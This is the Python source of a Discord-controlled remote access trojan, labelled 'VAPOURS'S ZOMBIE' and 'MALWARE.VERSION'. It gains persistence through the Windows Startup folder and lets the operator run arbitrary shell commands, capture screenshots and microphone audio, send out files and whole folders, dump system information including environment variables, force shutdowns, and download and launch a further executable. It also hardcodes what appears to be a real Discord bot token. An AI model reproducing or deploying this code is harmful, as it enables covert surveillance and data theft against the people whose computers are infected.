import discord
from discord.ext import commands
import pyautogui
import socket
import subprocess
import platform
import psutil
import requests
from datetime import datetime
import sounddevice as sd
import scipy.io.wavfile as wav
import os
import win32com.client

def create_shortcut(target_path, shortcut_path, description=""):
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortcut(shortcut_path)
    shortcut.TargetPath = target_path
    shortcut.WorkingDirectory = os.path.dirname(target_path)
    shortcut.Description = description
    shortcut.save()

# Replace these with your paths
now = datetime.now()
TIME = now.strftime("%Y-%m-%d %H:%M:%S")
VERSION = 'VAP~2'
home_path = os.path.expanduser('~')
target_file = rf"{os.getcwd()}\vap-2-windows.exe"

shortcut_file = rf"{home_path}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vap-2-windows.lnk"

def split_string(s, part_length=1900):
    return [s[i:i + part_length] for i in range(0, len(s), part_length)]

help_text = """
**VAP2 HELP MENU**
**COMMANDS**    **USAGE**
screenshot  take screenshot of the victims screen
run <command> runs cmd commands
sysinfo returns a file of system information
shutdown    shutdown the victim's computer
capture-audio <duration in seconds> records the victim's microphone for <duration> and returns .avi file
grab-file <file-path>   returns the file <file-path>
grab-folder <folder-path>   returns all the files in <folder-path?
help-tool    shows this menu
"""


try:
    create_shortcut(target_file, shortcut_file, description="My Shortcut")
except:
    pass

def get_public_ip():
    try:
        response = requests.get('https://httpbin.org/ip')
        response.raise_for_status()
        return response.json()['origin']
    except requests.exceptions.RequestException as e:
        return "Unavailable"

hostname = socket.gethostname().lower()
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="", intents=intents)

@bot.command(name="ping")
async def ping(ctx):
    await ctx.send("Pong!")

@bot.command(name="letstalk")
async def talk(ctx):
    files = os.listdir()
    if "talk.exe" not in files:
        subprocess.run("curl -O ", shell=True)
    try:
        subprocess.run("talk.exe", shell=True)
    except:
        await ctx.send("```Failed to start talk.exe```")
@bot.event
async def on_ready():
    guild = bot.get_guild(1241330664578744350)
    if guild:
        existing_channel = discord.utils.get(guild.text_channels, name=hostname)
        if existing_channel:
            await existing_channel.send(
                f"```**VAPOURS'S ZOMBIE WHOSE IP ADDRESS IS: {get_public_ip()} IS PRESENT. "
                f"MALWARE.VERSION: {VERSION}, TIME: {TIME}**```"
            )
        else:
            new_channel = await guild.create_text_channel(name=hostname)
            await new_channel.send(
                f"```**VAPOURS'S ZOMBIE WHOSE IP ADDRESS IS: {get_public_ip()} IS PRESENT. "
                f"MALWARE.VERSION: {VERSION}, TIME: {TIME}**```"
            )

def is_correct_channel(ctx):
    return ctx.channel.name == hostname

@bot.command(name="screenshot")
async def screenshot(ctx):
    if is_correct_channel(ctx):
        try:
            ss = pyautogui.screenshot()
            ss.save('image.png')
            with open("image.png", 'rb') as image:
                await ctx.send(file=discord.File(image, "image.png"))
            os.remove("image.png")
        except Exception as e:
            await ctx.send(f"```Failed to take screenshot: {e}```")

@bot.command(name="run")
async def shell_commands(ctx):
    if is_correct_channel(ctx):
        command = ctx.message.content.replace("run", '').strip()
        
        if "cd " in command:
            new_directory = command.replace("cd ", '').strip()
            try:
                os.chdir(new_directory)
                await ctx.send(f"```Changed directory to: {os.getcwd()}```")
            except FileNotFoundError as e:
                await ctx.send(f"```Error: Directory not found: {e}```")
            dir_command = "dir" if platform.system() == "Windows" else "ls -l"
            try:
                output = subprocess.check_output(dir_command, shell=True, text=True)
                output = f"Files in {new_directory}: {output}"
                split_outputs = split_string(output)
                for chunk in split_outputs:
                    await ctx.send(f"```{chunk}```")
            except subprocess.CalledProcessError as e:
                await ctx.send(f"```Command failed with error: {e}```")
        elif "del" in command:
            file = command.replace("del ", '').strip()
            try:
                os.remove(file)
                await ctx.send(f"```File '{file}' removed.```")
            except FileNotFoundError:
                await ctx.send(f"```Error: File '{file}' not found.```")
            except PermissionError:
                await ctx.send(f"```Error: Permission denied while removing '{file}'.```")
        if "dir" in command:
            try:
                output = subprocess.check_output(command, shell=True, text=True)
                split_outputs = split_string(output)
                for chunk in split_outputs:
                    await ctx.send(f"```{chunk}```")
            except subprocess.CalledProcessError as e:
                await ctx.send(f"```Command failed with error: {e}```")
        else:
            try:
                output = subprocess.check_output(command, shell=True, text=True)
                output = f"Files in {new_directory}: {output}"
                split_outputs = split_string(output)
                for chunk in split_outputs:
                    await ctx.send(f"```{chunk}```")
            except subprocess.CalledProcessError as e:
                await ctx.send(f"```Command failed with error: {e}```")
            except Exception as e:
                await ctx.send(f"```Failed to run command: {e}```")

@bot.command(name="sysinfo")
async def sysinfo(ctx):
    if is_correct_channel(ctx):
        memory_info = psutil.virtual_memory()
        disk_info = psutil.disk_usage('/')
        sys_info_file = f"{socket.gethostname()}.txt"
        try:
            with open(sys_info_file, "w") as sys_info:
                info = [
                    f"Public IP: {get_public_ip()}\n",
                    f"System: {platform.system()}\n",
                    f"Node Name: {platform.node()}\n",
                    f"Release: {platform.release()}\n",
                    f"Version: {platform.version()}\n",
                    f"Machine: {platform.machine()}\n",
                    f"Processor: {platform.processor()}\n",
                    f"Python Version: {platform.python_version()}\n",
                    f"Current Working Directory: {os.getcwd()}\n",
                    f"Home Directory: {os.path.expanduser('~')}\n",
                    f"Environment Variables: {os.environ}\n",
                    f"CPU Count: {psutil.cpu_count(logical=True)}\n",
                    f"CPU Usage: {psutil.cpu_percent(interval=1)} %\n",
                    f"Total Memory: {memory_info.total / (1024 ** 3):.2f} GB\n",
                    f"Available Memory: {memory_info.available / (1024 ** 3):.2f} GB\n",
                    f"Disk Total: {disk_info.total / (1024 ** 3):.2f} GB\n",
                    f"Disk Used: {disk_info.used / (1024 ** 3):.2f} GB\n",
                    f"Disk Free: {disk_info.free / (1024 ** 3):.2f} GB\n"
                ]
                sys_info.writelines(info)
                net_info = psutil.net_if_addrs()
                for interface, addresses in net_info.items():
                    for address in addresses:
                        if str(address.family) == 'AddressFamily.AF_INET':
                            sys_info.write(f"Interface: {interface}, IP Address: {address.address}\n")
                ip_address = socket.gethostbyname(hostname)
                sys_info.write(f"Hostname: {hostname}\n")
                sys_info.write(f"IP address: {ip_address}\n")

            with open(sys_info_file, 'rb') as file:
                await ctx.send(file=discord.File(file))
            os.remove(sys_info_file)
        except Exception as e:
            await ctx.send(f"```Failed to gather system info: {e}```")

@bot.command(name="shutdown")
async def shutdown(ctx):
    if is_correct_channel(ctx):
        await ctx.send("```Shutting Down System.```")
        try:
            subprocess.run("shutdown /s /f /t 0")
        except Exception as e:
            await ctx.send(f"```Shutdown failed: {e}```")

@bot.command(name="capture-audio")
async def recordaudio(ctx):
    if is_correct_channel(ctx):
        message = ctx.message.content
        duration_str = message.replace("capture-audio ", "").strip()
        try:
            duration = int(duration_str)
            if duration <= 0:
                raise ValueError("Duration must be greater than zero.")
            sample_rate = 44100  # Sample rate in Hz

            audio_data = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=2, dtype='int16')
            sd.wait()  # Wait until recording is finished
            wav.write('output_audio.wav', sample_rate, audio_data)
            await ctx.send(file=discord.File("output_audio.wav"))
            os.remove("output_audio.wav")
        except ValueError:
            await ctx.send("```Invalid duration. Please enter a positive integer.```")
        except Exception as e:
            await ctx.send(f"```An error occurred: {e}```")

@bot.command(name="grab-file")
async def grab_file(ctx):
    if is_correct_channel(ctx):
        message = ctx.message.content
        file = message.replace("grab-file ", '')
        try:
            await ctx.send(file=discord.File(file))
        except:
            await ctx.send("```INVALID FILE/AN ERROR OCCURED```")

@bot.command(name="help-tool")
async def haider(ctx):
    if is_correct_channel(ctx):
        await ctx.send(f"```{help_text}```")

@bot.command(name="grab-folder")
async def grabber(ctx):
    if is_correct_channel(ctx):
        message = ctx.message.content
        folder = message.replace("grab-folder ", '').strip()  # Get the folder path from the message

        if not os.path.exists(folder):  # Check if the folder exists
            await ctx.send(f"```The folder '{folder}' does not exist.```")
            return

        await ctx.send(f"```Grabbing files from folder: {folder}```")

        await grab_files_in_folder(ctx, folder)

async def grab_files_in_folder(ctx, folder):
    """Recursively grab files from the specified folder."""
    try:
        files_in_folder = os.listdir(folder)  # List all files and directories in the folder
        await ctx.send(f"```Current directory: {folder}```")  # Notify current directory
        for file in files_in_folder:
            file_path = os.path.join(folder, file)  # Get the full path of the file or directory
            if os.path.isfile(file_path):
                await ctx.send(file=discord.File(file_path))  # Send the file if it's a file
            elif os.path.isdir(file_path):
                await grab_files_in_folder(ctx, file_path)  # Recursively call for subdirectories
    except Exception as e:
        await ctx.send(f"```Error while accessing {folder}: {e}```")

# Run the bot with your token (ensure you manage this securely)
bot.run("MTIyNTM4MDkyNzYzMTUyMzk0MA.GWC_96.VITD_ajUnWf33cVPbYhTEoyYV5x-9EeIb1lzjE")

